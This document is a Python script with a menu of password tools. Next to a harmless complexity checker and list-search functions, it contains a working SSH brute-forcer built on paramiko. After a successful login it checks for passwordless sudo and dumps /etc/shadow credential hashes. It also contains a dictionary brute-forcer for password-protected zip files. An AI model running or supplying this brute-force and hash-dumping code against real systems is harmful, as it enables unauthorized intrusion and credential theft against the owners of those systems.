import sys
import time
import re
import paramiko
import zipfile


def file_iteration(file):

    try:
        with open(file, "r") as password_list:
            for password in password_list:

                password = password.strip("\n")
                
                print(password)
                time.sleep(1)

    except FileNotFoundError as msg:

        print('File does not exist!')

def string_search(phrase, file):

    with open(file, "r") as password_list:
        for password in password_list:
            password = password.strip("\n")

            if phrase.lower() == password:
                print("\nThe string you entered is in the provided password list!")
                print("\n")

                sys.exit(0)

        print("\nThe string you entered is not in the provided password list!")
        print("The program will now exit...")

        log_file = "test.txt"
        
        sys.exit(0)


def evaluate_password(password, length_req, caps_req, nums_req, syms_req):

    length = len(password)
    caps = len(re.findall(r'[A-Z]', password))
    nums = len(re.findall(r'[0-9]', password))
    syms = len(re.findall(r'[^A-Za-z0-9]', password))

    length_met = length >= length_req
    caps_met = caps >= caps_req
    nums_met = nums >= nums_req
    syms_met = syms >= syms_req

    print(f"\nPassword length: {length} (Required: {length_req}) - {'Met' if length_met else 'Not Met'}")
    print(f"Capital letters: {caps} (Required: {caps_req}) - {'Met' if caps_met else 'Not Met'}")
    print(f"Numbers: {nums} (Required: {nums_req}) - {'Met' if nums_met else 'Not Met'}")
    print(f"Symbols: {syms} (Required: {syms_req}) - {'Met' if syms_met else 'Not Met'}")

    if length_met and caps_met and nums_met and syms_met:
        print("\nSUCCESS: Your password meets all the complexity requirements!\n")
        print("The program will now exit...")

    else:
        print("\nFAILURE: Your password does not meet all the complexity requirements.\n")
        print("The program will now exit...")


def ssh_brute_force(host, username, passwords):

    attempts = 0

    with open(passwords, "r") as password_list:
        for password in password_list:
            password = password.strip("\n")

            try:
                print("[{}] Attempting password: '{}'!".format(attempts, password))

                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(host, username=username, password=password, timeout=1)

                print("[>] Valid password found: '{}'!".format(password))
                dump_credential_hashes(ssh_client)

                ssh_client.close()
                break

            except paramiko.AuthenticationException:
                print("[X] Invalid password!")

            except paramiko.SSHException as e:
                print(f"[X] SSH Exception: {e}")

            finally:
                attempts += 1


def dump_credential_hashes(ssh_client):

    try:
        stdin, stdout, stderr = ssh_client.exec_command('sudo -n true')

        if stdout.channel.recv_exit_status() != 0:
            print("[X] User does not have sudo privileges or requires a password for sudo.")
            return
        
        stdin, stdout, stderr = ssh_client.exec_command('sudo cat /etc/shadow')
        shadow_contents = stdout.read().decode()
        error = stderr.read().decode()

        if shadow_contents:
            print("[>] Credential hashes dumped successfully:\n")

            print(shadow_contents)

        elif error:
            print(f"[X] Error: {error}")

        else:
            print("[X] Failed to dump credential hashes.")

    except Exception as e:
        print(f"[X] Error dumping credential hashes: {e}")


def zip_brute_force(zip_filename, password_list_filename):

    try:
        zip_file = zipfile.ZipFile(zip_filename)

    except zipfile.BadZipFile:
        print("[X] The zip file is corrupted or not a zip file.")
        return

    with open(password_list_filename, 'r') as password_list:
        for password in password_list:
            password = password.strip("\n")

            try:
                zip_file.extractall(pwd=password.encode('utf-8'))

                print(f"[>] Valid password found: '{password}'")
                return
            
            except (RuntimeError, zipfile.BadZipFile):
                print(f"[X] Attempting password: '{password}' - Invalid password!")
    print("Failed to find the correct password.")

mode = input("""To iterate through list enter 1.
To input a string and compare with list enter 2.
To evaluate a password for complexity enter 3.
To authenticate to an SSH server, enter 4.
To brute force a password-locked zip file, enter 5.
Choose your option: """)

if mode == "1":

    file = input("Please enter the password list name (ex. password.txt): ")

    file_iteration(file)

elif mode == "2":

    phrase = input("Please provide the string used for the search: ")
    file = input("Please enter the password list name (ex. password.txt): ")

    string_search(phrase, file)

elif mode == "3":

    password = input("Please provide the password to evaluate: ")
    length_req = int(input("Required minimum length of the password: "))
    caps_req = int(input("Required minimum number of capital letters: "))
    nums_req = int(input("Required minimum number of numbers: "))
    syms_req = int(input("Required minimum number of symbols: "))

    evaluate_password(password, length_req, caps_req, nums_req, syms_req)
    
elif mode == "4":

    host = input("Please provide the host IP: ")
    username = input("Please provide the username: ")
    passwords = input("Please provide the password list file: ")

    ssh_brute_force(host, username, passwords)

elif mode == "5":

    zip_filename = input("Please provide the zip file name (ex. protected.zip): ")
    password_list_filename = input("Please provide the password list name (ex. password.txt): ")

    zip_brute_force(zip_filename, password_list_filename)

else:

    print("Wrong input! Exiting program..")
    sys.exit(1)


